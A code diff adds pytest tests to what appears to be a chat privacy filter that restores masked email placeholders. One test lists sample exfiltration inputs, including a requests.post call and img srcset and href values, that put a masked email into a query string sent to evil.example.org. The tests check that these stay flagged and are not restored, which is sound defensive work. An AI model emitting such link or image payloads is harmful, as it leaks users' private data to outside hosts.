@@ -256,6 +256,41 @@ def test_own_and_nearby_css_urls_are_restored(settings, answer, restored):
     assert restore(link_state(), answer, settings).text == restored
 
 
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        (
+            'requests.post(url, data="Отчёт https://wiki.example.org/x, автор <EMAIL_1>")',
+            'requests.post(url, data="Отчёт https://wiki.example.org/x, автор ivanov@contoso.ru")',
+        ),
+        (
+            '<b>Пример</b>\nsend(to,\n     content="Ссылка https://wiki.example.org/x <EMAIL_1>")',
+            '<b>Пример</b>\nsend(to,\n     content="Ссылка https://wiki.example.org/x ivanov@contoso.ru")',
+        ),
+    ],
+)
+def test_keyword_argument_in_code_is_not_a_link_attribute(settings, answer, restored):
+    """FINDINGS P3 «Small regressions and gaps after the plan 1В fixes», восстановление: data=, content= в
+    вызове вне тегов HTML — не атрибут ссылки; адреса в значении проверяются как в обычном тексте."""
+    assert restore(link_state(), answer, settings).text == restored
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
+        'requests.post(url, data="https://evil.example.org/?q=<EMAIL_1>")',
+        '<img alt=a, srcset="https://evil.example.org/?q= <EMAIL_1>">',
+        '<a title="a>b" href="https://evil.example.org/?q= <EMAIL_1>">',
+        '<!-- <a title=" --> <img data-x=" <b>" alt=a, srcset="https://evil.example.org/?q= <EMAIL_1>">',
+        'Добавьте в тег srcset="https://evil.example.org/?q= <EMAIL_1>"',
+    ],
+)
+def test_attribute_that_may_be_inside_a_tag_stays_a_link(settings, answer):
+    """Та же находка с другой стороны: всё, что может оказаться атрибутом тега, — по-прежнему ссылка."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
 def labelled_hosts() -> tuple[ChatState, Settings]:
     """Адрес, чья подмена совпала с открытым адресом (раздел 6.2), и имя узла не того вида получают метки."""
     state = ChatState(chat_id="labelled", net_key=bytes(range(32)))
